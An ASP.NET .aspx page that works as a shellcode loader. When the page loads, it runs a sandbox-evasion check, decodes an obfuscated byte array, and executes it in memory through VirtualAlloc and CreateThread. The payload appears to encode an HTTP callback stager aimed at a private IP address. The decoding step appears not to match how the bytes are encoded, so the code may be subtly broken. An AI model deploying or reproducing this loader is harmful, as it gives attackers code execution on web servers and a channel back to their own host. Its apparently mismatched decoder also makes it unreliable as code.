<%@ Page Language="C#" AutoEventWireup="true" %>                                                                                                                                                                    
<%@ Import Namespace="System.IO" %>                                                                                                                                                                                 
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {

        IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); 
        if (addr == null) 
        { 
                return; 
        }        
        byte[] wPcP = new byte[926] {
0x03, 0xb7, 0x7c, 0x1b, 0x0f, 0x17, 0x37, 0xff, 0xff, 0xff, 0xbe, 0xae, 0xbe, 0xaf, 0xad,
0xae, 0xa9, 0xb7, 0xce, 0x2d, 0x9a, 0xb7, 0x74, 0xad, 0x9f, 0xb7, 0x74, 0xad, 0xe7, 0xb7,
0x74, 0xad, 0xdf, 0xb7, 0x74, 0x8d, 0xaf, 0xb7, 0xf0, 0x48, 0xb5, 0xb5, 0xb2, 0xce, 0x36,
0xb7, 0xce, 0x3f, 0x53, 0xc3, 0x9e, 0x83, 0xfd, 0xd3, 0xdf, 0xbe, 0x3e, 0x36, 0xf2, 0xbe,
0xfe, 0x3e, 0x1d, 0x12, 0xad, 0xbe, 0xae, 0xb7, 0x74, 0xad, 0xdf, 0x74, 0xbd, 0xc3, 0xb7,
0xfe, 0x2f, 0x99, 0x7e, 0x87, 0xe7, 0xf4, 0xfd, 0x8a, 0x8d, 0x74, 0x7f, 0x77, 0xff, 0xff,
0xff, 0xb7, 0x7a, 0x3f, 0x8b, 0x98, 0xb7, 0xfe, 0x2f, 0xaf, 0x74, 0xb7, 0xe7, 0xbb, 0x74,
0xbf, 0xdf, 0xb6, 0xfe, 0x2f, 0x1c, 0xa9, 0xb7, 0x00, 0x36, 0xbe, 0x74, 0xcb, 0x77, 0xb7,
0xfe, 0x29, 0xb2, 0xce, 0x36, 0xb7, 0xce, 0x3f, 0x53, 0xbe, 0x3e, 0x36, 0xf2, 0xbe, 0xfe,
0x3e, 0xc7, 0x1f, 0x8a, 0x0e, 0xb3, 0xfc, 0xb3, 0xdb, 0xf7, 0xba, 0xc6, 0x2e, 0x8a, 0x27,
0xa7, 0xbb, 0x74, 0xbf, 0xdb, 0xb6, 0xfe, 0x2f, 0x99, 0xbe, 0x74, 0xf3, 0xb7, 0xbb, 0x74,
0xbf, 0xe3, 0xb6, 0xfe, 0x2f, 0xbe, 0x74, 0xfb, 0x77, 0xb7, 0xfe, 0x2f, 0xbe, 0xa7, 0xbe,
0xa7, 0xa1, 0xa6, 0xa5, 0xbe, 0xa7, 0xbe, 0xa6, 0xbe, 0xa5, 0xb7, 0x7c, 0x13, 0xdf, 0xbe,
0xad, 0x00, 0x1f, 0xa7, 0xbe, 0xa6, 0xa5, 0xb7, 0x74, 0xed, 0x16, 0xb0, 0x00, 0x00, 0x00,
0xa2, 0x95, 0xff, 0xb6, 0x41, 0x88, 0x96, 0x91, 0x96, 0x91, 0x9a, 0x8b, 0xff, 0xbe, 0xa9,
0xb6, 0x76, 0x19, 0xb3, 0x76, 0x0e, 0xbe, 0x45, 0xb3, 0x88, 0xd9, 0xf8, 0x00, 0x2a, 0xb7,
0xce, 0x36, 0xb7, 0xce, 0x2d, 0xb2, 0xce, 0x3f, 0xb2, 0xce, 0x36, 0xbe, 0xaf, 0xbe, 0xaf,
0xbe, 0x45, 0xc5, 0xa9, 0x86, 0x58, 0x00, 0x2a, 0x16, 0x6c, 0xff, 0xff, 0xff, 0xa5, 0xb7,
0x76, 0x3e, 0xbe, 0x47, 0x44, 0xfe, 0xff, 0xff, 0xb2, 0xce, 0x36, 0xbe, 0xae, 0xbe, 0xae,
0x95, 0xfc, 0xbe, 0xae, 0xbe, 0x45, 0xa8, 0x76, 0x60, 0x39, 0x00, 0x2a, 0x14, 0x86, 0xa4,
0xb7, 0x76, 0x3e, 0xb7, 0xce, 0x2d, 0xb6, 0x76, 0x27, 0xb2, 0xce, 0x36, 0xad, 0x97, 0xff,
0xcd, 0x3f, 0x7b, 0xad, 0xad, 0xbe, 0x45, 0x14, 0xaa, 0xd1, 0xc4, 0x00, 0x2a, 0xb7, 0x76,
0x39, 0xb7, 0x7c, 0x3c, 0xaf, 0x95, 0xf5, 0xa0, 0xb7, 0x76, 0x0e, 0x45, 0xe0, 0xff, 0xff,
0xff, 0x95, 0xff, 0x97, 0x7f, 0xcc, 0xff, 0xff, 0xb6, 0x76, 0x1f, 0xbe, 0x46, 0xfb, 0xff,
0xff, 0xff, 0xbe, 0x45, 0x8a, 0xb9, 0x61, 0x79, 0x00, 0x2a, 0xb7, 0x76, 0x0e, 0xb7, 0x76,
0x25, 0xb6, 0x38, 0x3f, 0x00, 0x00, 0x00, 0x00, 0xb2, 0xce, 0x36, 0xad, 0xad, 0xbe, 0x45,
0xd2, 0xf9, 0xe7, 0x84, 0x00, 0x2a, 0x7a, 0x3f, 0xf0, 0x7a, 0x62, 0xfe, 0xff, 0xff, 0xb7,
0x00, 0x30, 0xf0, 0x7b, 0x73, 0xfe, 0xff, 0xff, 0x14, 0x4c, 0x16, 0x1b, 0xfe, 0xff, 0xff,
0x17, 0x7d, 0x00, 0x00, 0x00, 0xd0, 0x9e, 0x8c, 0x86, 0x91, 0x9c, 0xd0, 0xb1, 0x9a, 0x88,
0x8b, 0x9e, 0x9d, 0xa0, 0x8f, 0x8d, 0x90, 0x92, 0x90, 0x8c, 0xff, 0xed, 0x35, 0xde, 0x6b,
0xd0, 0x2e, 0x28, 0x90, 0xfc, 0x64, 0xfb, 0xe4, 0xd8, 0xe9, 0x1e, 0xd7, 0xcc, 0x4c, 0xb1,
0xdb, 0x8f, 0xc7, 0x1a, 0x32, 0xef, 0x34, 0x17, 0xf9, 0xf1, 0x2b, 0x7a, 0xd8, 0xf8, 0x81,
0x25, 0x4d, 0x89, 0xe3, 0xa3, 0x49, 0x2d, 0x24, 0xfd, 0xcb, 0x5d, 0xe6, 0xe0, 0x96, 0xa5,
0xae, 0x01, 0xba, 0x98, 0x61, 0xfb, 0x5c, 0xaa, 0xe8, 0xff, 0xac, 0x9a, 0x9c, 0xd2, 0xb9,
0x9a, 0x8b, 0x9c, 0x97, 0xd2, 0xac, 0x96, 0x8b, 0x9a, 0xc5, 0xdf, 0x91, 0x90, 0x91, 0x9a,
0xf2, 0xf5, 0xac, 0x9a, 0x9c, 0xd2, 0xb9, 0x9a, 0x8b, 0x9c, 0x97, 0xd2, 0xb2, 0x90, 0x9b,
0x9a, 0xc5, 0xdf, 0x91, 0x90, 0xd2, 0x9c, 0x90, 0x8d, 0x8c, 0xf2, 0xf5, 0xac, 0x9a, 0x9c,
0xd2, 0xb9, 0x9a, 0x8b, 0x9c, 0x97, 0xd2, 0xbb, 0x9a, 0x8c, 0x8b, 0xc5, 0xdf, 0x9a, 0x92,
0x8f, 0x8b, 0x86, 0xf2, 0xf5, 0xbe, 0x9c, 0x9c, 0x9a, 0x8f, 0x8b, 0xd2, 0xb3, 0x9e, 0x91,
0x98, 0x8a, 0x9e, 0x98, 0x9a, 0xc5, 0xdf, 0x9a, 0x91, 0xd2, 0xaa, 0xac, 0xd3, 0x9a, 0x91,
0xc4, 0x8e, 0xc2, 0xcf, 0xd1, 0xca, 0xf2, 0xf5, 0xaa, 0x8c, 0x9a, 0x8d, 0xd2, 0xbe, 0x98,
0x9a, 0x91, 0x8b, 0xc5, 0xdf, 0xb2, 0x90, 0x85, 0x96, 0x93, 0x93, 0x9e, 0xd0, 0xca, 0xd1,
0xcf, 0xdf, 0xd7, 0xa8, 0x96, 0x91, 0x9b, 0x90, 0x88, 0x8c, 0xdf, 0xb1, 0xab, 0xdf, 0xce,
0xcf, 0xd1, 0xcf, 0xc4, 0xdf, 0xa8, 0x96, 0x91, 0xc9, 0xcb, 0xc4, 0xdf, 0x87, 0xc9, 0xcb,
0xd6, 0xdf, 0xbe, 0x8f, 0x8f, 0x93, 0x9a, 0xa8, 0x9a, 0x9d, 0xb4, 0x96, 0x8b, 0xd0, 0xca,
0xcc, 0xc8, 0xd1, 0xcc, 0xc9, 0xdf, 0xd7, 0xb4, 0xb7, 0xab, 0xb2, 0xb3, 0xd3, 0xdf, 0x93,
0x96, 0x94, 0x9a, 0xdf, 0xb8, 0x9a, 0x9c, 0x94, 0x90, 0xd6, 0xdf, 0xbc, 0x97, 0x8d, 0x90,
0x92, 0x9a, 0xd0, 0xc6, 0xc8, 0xd1, 0xcf, 0xd1, 0xcb, 0xc9, 0xc6, 0xcd, 0xd1, 0xc8, 0xce,
0xdf, 0xac, 0x9e, 0x99, 0x9e, 0x8d, 0x96, 0xd0, 0xca, 0xcc, 0xc8, 0xd1, 0xcc, 0xc9, 0xf2,
0xf5, 0xff, 0x31, 0xcb, 0x1e, 0x96, 0x1c, 0x15, 0xa5, 0xd3, 0x7f, 0x43, 0xad, 0x9d, 0x8a,
0x9d, 0x89, 0x09, 0xe3, 0xab, 0xe1, 0xe5, 0xcd, 0x59, 0xae, 0x22, 0x03, 0x9e, 0xb2, 0x29,
0x2c, 0x43, 0x78, 0x08, 0x73, 0xbe, 0x76, 0xde, 0x98, 0x14, 0x0c, 0x83, 0x73, 0x06, 0xf5,
0xa9, 0xa5, 0x48, 0xa4, 0x0f, 0xa3, 0xba, 0x48, 0x6c, 0x93, 0x7e, 0xc5, 0x0e, 0x55, 0x15,
0x8c, 0x46, 0x5c, 0xf7, 0x88, 0x2a, 0x89, 0x17, 0xd3, 0x5d, 0x70, 0xcd, 0xfd, 0xff, 0xbe,
0x41, 0x0f, 0x4a, 0x5d, 0xa9, 0x00, 0x2a, 0xb7, 0xce, 0x36, 0x45, 0xff, 0xff, 0xbf, 0xff,
0xbe, 0x47, 0xff, 0xef, 0xff, 0xff, 0xbe, 0x46, 0xbf, 0xff, 0xff, 0xff, 0xbe, 0x45, 0xa7,
0x5b, 0xac, 0x1a, 0x00, 0x2a, 0xb7, 0x6c, 0xac, 0xac, 0xb7, 0x76, 0x18, 0xb7, 0x76, 0x0e,
0xb7, 0x76, 0x25, 0xbe, 0x47, 0xff, 0xdf, 0xff, 0xff, 0xb6, 0x76, 0x06, 0xbe, 0x45, 0xed,
0x69, 0x76, 0x1d, 0x00, 0x2a, 0xb7, 0x7c, 0x3b, 0xdf, 0x7a, 0x3f, 0x8b, 0x49, 0x99, 0x74,
0xf8, 0xb7, 0xfe, 0x3c, 0x7a, 0x3f, 0x8a, 0x28, 0xa7, 0xa7, 0xa7, 0xb7, 0xfa, 0xff, 0xff,
0xff, 0xff, 0xaf, 0x3c, 0x17, 0x80, 0x02, 0x00, 0x00, 0xce, 0xcf, 0xd1, 0xce, 0xcf, 0xd1,
0xce, 0xcb, 0xd1, 0xce, 0xce, 0xcd, 0xff, 0xd7, 0x23, 0xec, 0xa1
};

        for(int i = 0; i < wPcP.Length; i++)
        {
                wPcP[i] = (byte)(((uint)wPcP[i] -2) & 0xFF); 
        }

        IntPtr sq9JSLxMNGv = VirtualAlloc(IntPtr.Zero,(UIntPtr)wPcP.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(wPcP,0,sq9JSLxMNGv,wPcP.Length);
        IntPtr gfRZMbBT9LX = IntPtr.Zero;
        IntPtr aC9rBy = CreateThread(IntPtr.Zero,UIntPtr.Zero,sq9JSLxMNGv,IntPtr.Zero,0,ref gfRZMbBT9LX);
    }
</script>
